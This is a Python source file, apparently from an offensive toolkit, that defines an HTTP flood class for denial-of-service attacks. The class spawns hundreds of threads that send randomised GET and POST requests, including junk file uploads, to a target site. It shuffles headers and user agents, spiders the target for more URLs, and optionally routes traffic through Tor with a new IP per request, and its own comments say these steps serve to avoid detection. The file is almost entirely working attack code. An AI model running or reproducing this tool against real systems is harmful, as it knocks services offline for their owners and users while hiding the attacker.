from bane.ddos.utils import *

class http_puncher(DDoS_Class):
    def __init__(
        self,
        u,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        urls=[],
        threads=500,
        timeout=5,
        duration=60,
        logs=False,
        tor=False,
        scrape_target=True,
        scraped_urls=32
    ):
        self.domain=u.split('://')[1].split('/')[0]
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.method = method
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.timeout = timeout
        self.tor = tor
        if urls==[] or urls==None:
            self.urls=[self.target]
        elif type(urls)==str:
            self.urls=read_file(urls)
        if scrape_target==True:
            if tor==True:
                proxy=get_tor_socks5_proxy
            else:
                proxy=None
            if logs==True:
                print('[i] Gathering more URLs to avoid detection by requesting the same URL...')
            self.urls=spider_url(self.target,cookie=cookie,proxy=proxy,max_pages=scraped_urls)
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    req_session=requests.Session()
                    headers={'User-Agent':random.choice(ua)}
                    headers.update({"Host":self.domain})
                    for l in range(random.randint(1, 5)):
                        ed = random.choice(ec)
                        oi = random.randint(1, 3)
                        if oi == 2:
                            gy = 0
                            while gy < 1:
                                df = random.choice(ec)
                                if df != ed:
                                    gy += 1
                            ed += ", "
                            ed += df
                    l = random.choice(al)
                    for n in range(random.randint(0, 5)):
                        l += ";q={},".format(round(random.uniform(0.1, 1), 1)) + random.choice(al)
                    kl = random.randint(1, 2)
                    if random.randint(0,1)==1:
                        headers.update({'Accept':random.choice(a)})
                    if random.randint(0,1)==1:
                        headers.update({'Accept-Language':random.choice(al)})
                    if random.randint(0,1)==1:
                        headers.update({'Accept-Encoding':ed})
                    if random.randint(0,1)==1:
                        headers.update({'Accept-Charset':random.choice(ac)})
                    if random.randint(0,1)==1:
                        headers.update({'Connection':'Keep-Alive'})
                        headers.update({'Keep-Alive':str(random.randint(100,1000))})
                    else:
                        headers.update({'Connection':'Close'})
                    if random.randint(0,1)==1:
                        headers.update({'Cache-Control':random.choice(cc)})
                    if random.randint(0,1)==1:
                        s=referers+self.urls
                        headers.update({'Referer':random.choice(s)})
                    header_keys = list(headers.keys())
                    random.shuffle(header_keys)
                    headers = {key: headers[key] for key in header_keys}
                    req_session.headers=OrderedDict(list(headers.items()))
                    if self.tor==True:
                        proxy=get_tor_socks5_proxy(new_ip=True)
                    else:
                        proxy=None
                    url=random.choice(self.urls)
                    if self.method==1:
                        meth="get"
                    elif self.method==2:
                        meth='post'
                    else:
                        r=random.randint(1,2)
                        if r==1:
                            meth="get"
                        elif r==2:
                            meth='post'
                    if meth=='post':
                        data={}
                        files={}
                        files_count=random.randint(0,3)
                        for x in range(files_count):
                            parameter_name_len=random.randint(1,15)
                            parameter_name=''.join([random.choice(lis) for x in range(parameter_name_len)])
                            file_name_len=random.randint(1,15)
                            file_name=''.join([random.choice(lis) for x in range(file_name_len)])+'.'+random.choice(list(files_upload.keys()))
                            file_content_len=random.randint(1,10240)
                            file_content=''.join([random.choice(lis) for x in range(file_content_len)])+'.'+random.choice(list(files_upload.keys()))
                            files.update({parameter_name:(file_name,file_content)})
                        params_count=random.randint(0,5)
                        for x in range(params_count):
                            key_len=random.randint(0,15)
                            key=''.join([random.choice(lis) for x in range(key_len)])
                            val_len=random.randint(0,100)
                            val=''.join([random.choice(lis) for x in range(val_len)])
                            data.update({key:val})
                        if files=={}:
                            files=None
                        req_session.post(url,data=data,files=files,proxies=proxy,timeout=self.timeout,verify=False,headers=headers)
                    else:   
                        prm={}
                        params_count=random.randint(1,8)
                        for x in range(params_count):
                            key_len=random.randint(1,8)
                            key=''.join([random.choice(lis) for x in range(key_len)])
                            val_len=random.randint(0,32)
                            val=''.join([random.choice(lis) for x in range(val_len)])
                            prm.update({key:val})
                        req_session.get(url,params=prm,proxies=proxy,timeout=self.timeout,verify=False,headers=headers)
                    self.counter+=1
                    if self.logs == True:
                                sys.stdout.write(
                                    "\rRequest: {} | Type: {}".format(
                                        self.counter, meth
                                    )
                                )
                                sys.stdout.flush()
                except Exception as ex:
                    pass#raise(ex)
                time.sleep(0.1)
            self.kill()
        except Exception as e:
            pass#raise(e)